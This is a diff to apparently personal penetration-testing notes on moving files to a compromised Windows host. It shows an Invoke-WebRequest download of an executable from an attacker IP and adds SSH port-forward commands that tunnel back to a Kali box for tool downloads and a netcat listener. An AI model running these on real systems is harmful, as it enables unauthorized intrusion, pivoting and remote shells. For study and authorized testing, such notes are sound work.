@@ -171,3 +171,24 @@ We may need to transfer a binary to a machine we've gained access to so we can p
 ```powershell
 PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
 ```
+
+
+
+### Tunneling to Kali Web Server
+
+If the host has ssh we can connect back to our kali box to tunnel traffic.
+
+This is a command to tunnel all traffic through a jump host back to our kali web server. This is useful when downloading tool to a host inside an internal network.&#x20;
+
+```powershell
+C:\Users\web_svc>ssh -N -L 0.0.0.0:1234:192.168.45.186:8000 kali@192.168.45.186
+```
+
+### Tunneling NC Listener
+
+Like the above command, we can do the same to create a tunnel for a nc listener
+
+```powershell
+C:\Users\web_svc>ssh -N -L 0.0.0.0:1234:192.168.45.186:4444 kali@192.168.45.186
+```
+
